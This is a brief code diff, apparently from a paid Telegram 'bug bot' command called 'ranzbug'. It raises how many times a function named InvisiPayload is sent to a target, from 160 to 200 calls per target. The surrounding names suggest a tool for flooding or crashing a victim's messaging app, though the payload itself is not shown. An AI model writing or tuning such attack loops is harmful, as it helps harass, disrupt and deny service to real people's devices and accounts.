@@ -1683,7 +1683,10 @@ bot.command("ranzbug", checkPremium, async (ctx) => {
           continue;
         }
 
-        for (let i = 0; i < 160; i++) {
+        for (let i = 0; i < 50; i++) {
+          await InvisiPayload(sock, target);
+          await InvisiPayload(sock, target);
+          await InvisiPayload(sock, target);
           await InvisiPayload(sock, target);
         }
         successCount++;
